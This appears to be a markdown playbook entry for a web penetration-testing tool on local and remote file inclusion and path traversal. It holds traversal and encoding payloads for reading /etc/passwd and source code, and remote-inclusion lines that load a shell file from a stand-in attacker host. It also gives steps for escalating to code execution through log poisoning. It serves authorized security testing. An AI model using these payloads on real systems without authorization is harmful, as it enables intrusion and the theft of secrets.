---
id: lfi
name: Local File Inclusion / Path Traversal
phase: exploit
severity: critical
aliases: [lfi, rfi, path-traversal, directory-traversal, traversal]
tags: [web, injection, filesystem]
---

# Local File Inclusion / Path Traversal

## When to use
Requests carry file or path parameters: ?file=, ?page=, ?template=, ?download=, ?path=, ?lang=, ?img=.
Recon signal: "failed to open stream", include errors, stack traces naming filesystem paths, or PHP wrappers.
Download and preview features, theme/lang selection, and log viewers are common injection points.

## Quick checks
1. Append ../ sequences and watch for error changes or different content.
2. Request absolute paths: /etc/passwd (Linux) and C:\Windows\win.ini (Windows).
3. Try php://filter/convert.base64-encode/resource=index.php to read source.
4. Test double encoding %252e%252e%252f and legacy null byte %00 truncation.
5. Test RFI with ?page=http://attacker.tld/evil.txt if allow_url_include is on.
6. Check log poisoning paths such as /var/log/apache2/access.log and /proc/self/environ.

## Payloads / test cases
- ../../../../etc/passwd
- ..%2f..%2f..%2fetc%2fpasswd
- ....//....//....//etc/passwd
- %252e%252e%252f%252e%252e%252fetc%252fpasswd
- php://filter/convert.base64-encode/resource=index.php
- /etc/passwd%00.png (PHP < 5.3.4)
- ?page=http://attacker.tld/shell.txt (RFI)

## Detection & confirmation
1. Confirm content matches a known file (root:x:0:0 in /etc/passwd, [fonts] in win.ini).
2. Use php://filter base64 output and decode it to prove source disclosure.
3. For blind LFI, use an out-of-band channel (wrapper chain, log injection with a unique marker) or timing.
4. Record the minimum traversal depth and exact encoding that succeeds.
5. Escalate toward RCE via log poisoning or session-file inclusion with a controlled marker.

## Escalation
LFI to RCE via log poisoning or session files -> P1; arbitrary read of secrets, keys, or config -> P1/P2; single low-value file read -> P3 (see prioritization.md).

## Evidence to capture
- Raw request and response containing file contents.
- Decoded base64 output for php://filter reads.
- Screenshot of the disclosed file in the browser.
- Exact parameter, encoding, and traversal depth used.
- Marker string for blind/OOB confirmation.

## Common false positives
- Error message echoes the path but no file content is returned.
- Framework normalizes traversal before the app sees the input.
- Read is restricted to a whitelisted template directory by realpath checks.
- WAF blocks the payload at the edge while the origin accepts it (retest against the origin IP).

## Related skills
- [[file-upload]]
- [[ssti]]
- [[open-redirect]]
